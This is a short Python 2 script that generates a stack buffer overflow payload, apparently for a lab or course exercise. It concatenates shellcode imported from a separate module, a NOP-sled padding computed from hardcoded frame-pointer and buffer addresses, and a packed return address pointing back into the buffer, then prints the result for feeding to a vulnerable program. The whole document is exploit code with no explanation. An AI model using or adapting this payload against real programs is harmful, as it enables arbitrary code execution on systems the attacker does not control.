from shellcode import shellcode
from struct import pack

ebp = 0xbffef3e8
buf = 0xbffef7f0

padding = '\x90' * (ebp - buf + 4 - len(shellcode))

print shellcode + padding + pack("<I", buf)
